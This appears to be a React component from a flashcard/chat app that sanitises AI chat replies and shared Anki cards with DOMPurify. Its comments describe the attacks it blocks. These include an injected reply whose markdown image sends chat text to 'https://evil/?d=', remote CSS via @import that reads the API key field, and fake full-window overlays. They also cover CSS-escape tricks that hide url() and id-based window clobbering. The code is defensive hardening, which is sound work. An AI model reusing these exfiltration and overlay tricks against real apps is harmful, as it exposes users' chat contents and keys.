import { useMemo } from 'react'
import { marked } from 'marked'
import DOMPurify from 'dompurify'

// Renders markdown (chat/help messages) as sanitized HTML, themed via the global
// `.md-body` rules in App.jsx's <style> block so it flips with Ocean Light / Dark.
// Links open in a new tab. Inline + block markdown both supported.
marked.setOptions({ breaks: true, gfm: true })

// Open all rendered links in a new tab (added once at module load).
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (String(node.nodeName).toLowerCase() === 'a') { // SVG <a> too (lowercase tagName): it navigated the window itself
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
})

// ONE sanitizer for every piece of HTML the app renders that it did not write itself (AI replies, cards
// from shared Anki decks). DOMPurify's defaults keep <style> and form controls: a card back or an
// injected chat reply carrying "<style>@import url(https://…)</style>" restyled the WHOLE app, could put
// a full-window fake screen over it, and pull remote CSS that reads attribute values (the API key box).
// Inline styles stay (Anki cards use them for colour) unless they load something or position an element
// over the app.
// Nothing here may LOAD a URL by itself either: an injected reply's "![](https://evil/?d=<chat text>)"
// sent data out with no click, and "<img src=/api/...>" fired same-origin API calls (each spawning a
// process) from inside the app. No reply or looked-up card needs media rendered, so media is dropped.
// (Render-only: cards WRITTEN to Anki go through sanitizeCardHtml, which keeps their images.)
const FORBID_TAGS = ['style', 'link', 'meta', 'base', 'form', 'input', 'textarea', 'select', 'button', 'option', 'iframe', 'frame', 'object', 'embed',
  'img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'use', 'feimage',
  'dialog'] // <dialog open> is position:absolute by the browser's own stylesheet: a full-window fake screen the style hook never saw
const FORBID_ATTR = ['background', 'poster', 'srcset', 'ping', 'formaction', 'xlink:href', 'popover', 'popovertarget', 'popovertargetaction']
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  // SVG presentation attributes take url() too (filter, mask, clip-path, fill, stroke, marker-*), and gradients,
  // patterns and textPath take an href: each loaded a remote URL the moment a reply rendered (checked in Chromium).
  // Only a LOCAL reference ("url(#grad)", href="#id") stays; a link's href on <a> is untouched.
  if (data.attrName !== 'style') {
    const v = String(data.attrValue || '')
    // SVG presentation attributes are parsed as CSS, so an escape hides url( ("\75 rl(https://...)" fetched with
    // no click): any backslash outside a link's href is refused, like in style.
    if (v.includes('\\') &&!(data.attrName === 'href' && String(node.nodeName).toLowerCase() === 'a')) { data.keepAttr = false; return }
    if (/url\s*\(|image-set/i.test(v) && !/^\s*url\(\s*['"]?#[^)]*\)\s*$/i.test(v)) data.keepAttr = false
    if (data.attrName === 'href' && String(node.nodeName).toLowerCase() !== 'a' && !/^\s*#/.test(v)) data.keepAttr = false
    return
  }
  const v = String(data.attrValue || '')
  // Also refused: CSS escapes and comments (they disguise the rest: "position:/**/fixed", "\75rl(") and
  // image-set(), which loads a URL given as a plain string, without url(. "-webkit-sticky" is Chromium's alias of sticky.
  if (/[\\]|\/\*/.test(v) || /url\s*\(|image-set|@import|expression\s*\(|position\s*:\s*(-webkit-)?(fixed|absolute|sticky)/i.test(v)) data.keepAttr = false
})
// SANITIZE_NAMED_PROPS by default: an id or name in content the app did not write ("<i id=ebikiWindow>" in a reply or a
// shared-deck card back) became a window property and the app took itself for the Electron window. Only first-party
// files (the Legends art, whose ids carry local url(#id) references) turn it off.
export const sanitizeHtml = (html, opts = {}) => DOMPurify.sanitize(String(html ?? ''), { SANITIZE_NAMED_PROPS: true, ...opts, FORBID_TAGS, FORBID_ATTR })

export default function Markdown({ text, style }) {
  const html = useMemo(() => {
    const raw = marked.parse(String(text || ''), { async: false })
    // SANITIZE_NAMED_PROPS: an id in a reply ("<i id=ebikiWindow>") became window.ebikiWindow in a tab, and the app
    // took itself for the Electron window and crashed on every reload.
    const clean = sanitizeHtml(raw, { ADD_ATTR: ['target', 'rel'], SANITIZE_NAMED_PROPS: true })
    return clean
  }, [text])

  return (
    <div
      className="md-body"
      style={style}
      // eslint-disable-next-line react/no-danger
      dangerouslySetInnerHTML={{ __html: html }}
    />
  )
}
